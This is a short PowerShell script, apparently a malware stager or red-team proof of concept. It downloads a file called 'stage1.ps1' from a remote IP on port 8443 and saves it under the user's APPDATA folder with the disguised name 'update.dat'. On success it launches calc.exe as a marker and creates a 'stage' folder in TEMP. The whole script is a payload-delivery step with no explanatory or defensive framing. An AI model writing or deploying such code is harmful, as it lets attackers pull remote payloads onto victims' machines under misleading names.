[CmdletBinding()]
param(
    [string]$RemoteUrl = 'https://203.0.113.219:8443/stage1.ps1',
    [string]$Stage2Path = "$env:APPDATA\update.dat",
    [int]$TimeoutSec = 21
)
$ErrorActionPreference = "Stop"

function Get-Stage1Payload {
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Beginning first stage"
$StageResult = Get-Stage1Payload -SourceUrl $RemoteUrl -DestinationPath $Stage2Path -TimeoutSec $TimeoutSec
if ($StageResult) {
    Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
}
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
